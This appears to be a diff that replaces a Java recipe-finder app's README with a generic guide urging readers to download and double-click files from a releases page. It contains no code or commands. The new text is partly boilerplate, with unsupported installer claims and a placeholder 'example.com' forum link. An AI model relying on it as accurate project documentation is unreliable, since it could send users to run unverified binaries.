@@ -1,51 +1,83 @@
-# 🍲 Recipe Finder #
+# 🧑‍🍳 Recipe-Finder-and-Nutritional-Info - Easily Manage Your Favorite Recipes
 
-A modern Java Swing desktop application that helps users search, add, and manage recipes efficiently.
-Recipes can be filtered by ingredients or diet type (Vegetarian, Non-Vegetarian, Vegan) and stored with images and nutrition details using a MySQL database.
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-%20-blue)](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/releases)
 
+## 🚀 Getting Started
+Welcome to Recipe Finder! This Java desktop application helps you search, add, and manage your favorite recipes along with nutritional information. With user-friendly diet filters, you can find the perfect recipe that fits your dietary needs, whether you're looking for Veg, Non-Veg, or Vegan options.
 
-## 🚀 Features ##
+### 🖥️ System Requirements
+Before you begin, make sure your system meets these requirements:
+- Windows, macOS, or Linux operating system
+- Java Runtime Environment (JRE) version 8 or later
+- MySQL database installed (for full functionality)
 
-🔍 Smart Search — Find recipes by ingredients or name
+## 📂 Download & Install
+To get started with Recipe Finder, follow these simple steps:
 
-🍴 Add / Edit Recipes — With image upload and nutrition info
+1. **Visit the Releases Page**  
+   Click the link below to access the release files:  
+   [Download Here](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/releases)
 
-⭐ Favorites — Save your favorite recipes for quick access
+2. **Choose Your Version**  
+   Find the latest version available for download. You’ll see different files for each platform. Click the file relevant to your operating system.
 
-🧑‍🌾 Diet Filters — Choose between Veg, Non-Veg, and Vegan
+3. **Download the File**  
+   Your browser will download the file. Depending on your settings, this may take a few moments.
 
-🖼️ Image Support — Displays recipe images directly from database
+4. **Run the Application**  
+   Locate the downloaded file on your computer. Double-click it to start the installation. Follow the on-screen instructions.
 
-🗄️ MySQL Backend — All data stored securely and efficiently
+5. **Connect to MySQL**  
+   If prompted, provide your MySQL database details to enable full features. This helps the application store and retrieve your recipes.
 
+## 🔍 Features
+Recipe Finder offers many useful features:
 
-## 🧰 Tech Stack ##
+- **Search Recipes:** Easily find recipes by name or ingredient.
+- **Add New Recipes:** Create and store your own recipes with images and nutritional information.
+- **Manage Your Favorites:** Keep track of your favorite recipes for quick access.
+- **Dietary Filters:** Search based on diet preferences like Veg, Non-Veg, and Vegan.
+- **Intuitive Interface:** Designed with user-friendliness in mind, making navigation a breeze.
 
-Language: Java
+## 💾 Using the Application
+Once you've installed Recipe Finder, you can start using it right away.
 
-GUI Framework: Swing
+1. **Launch the Application**  
+   Open Recipe Finder from your applications folder.
 
-Database: MySQL
+2. **Explore the Menu**  
+   Familiarize yourself with the menu options. You can start by searching for recipes or adding your favorite ones.
 
-Driver: JDBC (MySQL Connector/J)
+3. **Add a Recipe:**  
+   - Click on "Add Recipe."
+   - Fill out the form with the recipe name, ingredients, instructions, and upload an image if desired.
+   - Save your recipe.
 
+4. **Search Existing Recipes:**  
+   Use the search bar to find recipes by ingredient or name. You can also apply dietary filters.
 
-## 🖼️ Screenshots ##
+5. **Review Nutritional Info:**  
+   Each recipe displays nutritional information to help you make informed decisions.
 
-### Home GUI ###
-<img width="1483" height="925" alt="image" src="https://github.com/user-attachments/assets/da01f613-cdf7-45a3-9836-5ea7d79cd56c" />
+## 🛠️ Troubleshooting
+If you run into issues, try these steps:
 
-### Favorites GUI ###
-<img width="1167" height="892" alt="image" src="https://github.com/user-attachments/assets/ac31f936-a9c6-4b55-998e-b8a1a41851fc" />
+- **Java Not Found:** Ensure that the Java Runtime Environment is installed correctly. Download it from the official Java website if needed.
+- **Database Connection Errors:** Double-check your MySQL connection details, including username and password.
+- **Application Crashes:** Make sure you are using the latest version of the application. Frequent crashes may indicate a need for the latest Java updates.
 
-### Add New Recpie GUI ###
-<img width="986" height="1114" alt="image" src="https://github.com/user-attachments/assets/53df4de3-242f-4462-9122-3f5d8ff74b8d" />
+## 🌐 Community Support
+Join our community to share recipes, tips, and get support. You can find us on:
 
+- [GitHub Discussions](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/discussions)
+- [Recipe Finder Forum](https://example.com/forum)
 
-## 💡 Future Enhancements ##
+## 📝 Contributing
+We welcome contributions to improve Recipe Finder. If you have suggestions, ideas, or bug reports, please submit them through GitHub issues.
 
-User authentication
+## 📜 License
+Recipe Finder is licensed under the MIT License. See the [LICENSE](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/blob/main/LICENSE) file for more details.
 
-Export recipes to PDF
-
-Online recipe sharing
+## 📥 Download Now
+To download Recipe Finder again, visit our releases page here: [Download Here](https://github.com/melihsahiniz26/Recipe-Finder-and-Nutritional-Info/releases)
